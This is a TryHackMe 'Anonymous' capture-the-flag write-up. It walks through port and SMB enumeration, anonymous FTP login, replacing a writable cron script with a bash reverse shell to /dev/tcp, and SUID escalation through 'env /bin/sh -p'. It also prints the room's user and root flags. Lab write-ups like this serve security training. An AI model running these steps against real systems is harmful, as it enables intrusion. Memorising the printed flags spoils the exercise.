---
title: "TryHackMe Anonymous CTF Writeup 2025"
datePublished: Sun May 04 2025 13:14:59 GMT+0000 (Coordinated Universal Time)
cuid: cma9obziw000n09kzbjc4ehi2
slug: tryhackme-anonymous-ctf-writeup-2025
cover: https://cdn.hashnode.com/res/hashnode/image/upload/v1767962217814/837bf381-7bf2-469a-be79-0e0c7d838584.jpeg

---

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1746364091482/a8f3c850-5beb-4778-be48-a372415d0eb9.png align="center")

<div data-node-type="callout">
<div data-node-type="callout-emoji">💡</div>
<div data-node-type="callout-text">please note that “&lt;ip&gt;” in this writeup stands for the target machine’s IP given by THM</div>
</div>

I did an nmap scan for all possible ports

```plaintext
▶ nmap -p- <ip>
Starting Nmap 7.94SVN (https://nmap.org) at 2025-02-01 15:38 EST Nmap scan report for <homeip>
Host is up (0.10s latency).
Not shown: 65531 closed tcp ports (reset)
PORT STATE SERVICE
21/tcp open ftp
22/tcp open ssh
139/tcp open netbios-ssn
445/tcp open microsoft-ds
Nmap done: 1 IP address (1 host up) scanned in 345.14 seconds
```

1. Enumerate the machine.  How many ports are open?  
    `4`
    
2. What service is running on port 21?  
    `ftp`
    
3. What service is running on ports 139 and 445?  
    `smb`
    

We can figure out the SMB shares through smbmap

```plaintext
smbmap -H <ip>
```

Now we know three shares, one of which is `pics` , let’s try to access it

```plaintext
▶ smbclient //<ip>/pics
Password for [WORKGROUP\berzi]:
Try "help" to get a list of possible commands.
smb: \> put test.txt
test.txt does not exist
smb: \> whoami
whoami: command not found
smb: \> pwd
Current directory is \\<ip>\pics\
smb: \> ls
  .                                   D        0  Sun May 17 16:41:34 2020
  ..                                  D        0  Thu May 14 07:29:10 2020
  corgo2.jpg                          N    42663  Tue May 12 06:13:42 2020
  puppos.jpeg                         N   265188  Tue May 12 06:13:42 2020

		20508240 blocks of size 1024. 13306804 blocks available
```

I found two files inside, and tried my best to figure out if there was any steganography involved, i tried channel splitting, binwalking, extracting strings but eventually I gave up.

```plaintext
corgo2.jpg
puppos.jpeg
```

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1746364418399/5b87a29c-083b-47ae-b4db-90616c94e11f.jpeg align="center")

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1746364427298/1ff56f7e-9d51-439b-a2ae-84e9b844890b.jpeg align="center")

turns out they were just ordinary dog images

1. There's a share on the user's computer.  What's it called?  
    `pics`
    

Now, we need to get a user shell, I tried if FTP was open to anonymous login

```plaintext
▶ ftp <ip> 21
Connected to 10.10.228.4.
220 NamelessOne's FTP Server!
Name (<ip>:berzi): anonymous

331 Please specify the password.
Password: 
230 Login successful.
```

There was only the `scripts` directory

```plaintext
ftp> ls
229 Entering Extended Passive Mode (|||49675|)
150 Here comes the directory listing.
-rwxr-xrwx    1 1000     1000           55 May 04 12:02 clean.sh
-rw-rw-r--    1 1000     1000         3698 May 04 10:58 removed_files.log
-rw-r--r--    1 1000     1000           68 May 12  2020 to_do.txt
226 Directory send OK.
```

The `clean.sh` file seemed like a file used during cronjobs, so I wrote a reverse shell script and replaced it with the same.

```plaintext
▶ cat clean.sh 
#!/bin/bash

tmp_files=0
echo $tmp_files
if [ $tmp_files=0 ]
then
        echo "Running cleanup script:  nothing to delete" >> /var/ftp/scripts/removed_files.log
else
    for LINE in $tmp_files; do
        rm -rf /tmp/$LINE && echo "$(date) | Removed file /tmp/$LINE" >> /var/ftp/scripts/removed_files.log;done
fi
```

Here’s the modified script

```plaintext
▶ cat clean.sh 
#!/bin/bash
bash -i >& /dev/tcp/"<ip>"/1337 0>&1
```

I opened a netcat listener on my attacker machine with `nc -lvp 1337` and ran the script on the target

```plaintext
ftp> put clean.sh
local: clean.sh remote: clean.sh
229 Entering Extended Passive Mode (|||64918|)
150 Ok to send data.
100% |*********************************************************************|    41      444.87 KiB/s    00:00 ETA
226 Transfer complete.
41 bytes sent in 00:00 (0.07 KiB/s)


ftp> bash clean.sh
?Invalid command.
```

this gave me the target shell on my attacker machine. the `user.txt` was right in the directory i logged into.

1. user.txt
    
    `90d6f992585815ff991e68748c414740`
    

I checked for files which had SUID bit-set applied.

```plaintext
find / -perm -u=s -type f 2>/dev/null
```

and among the output, I found quite a few, but `/usr/bin/env` worked for me. I ran this:

```plaintext
namelessone@anonymous.com:~$ env /bin/sh -p
# cd /root
# cat root.txt
4d930091c31a622a7ed10f27999af363
```

1. root.txt  
    `4d930091c31a622a7ed10f27999af363`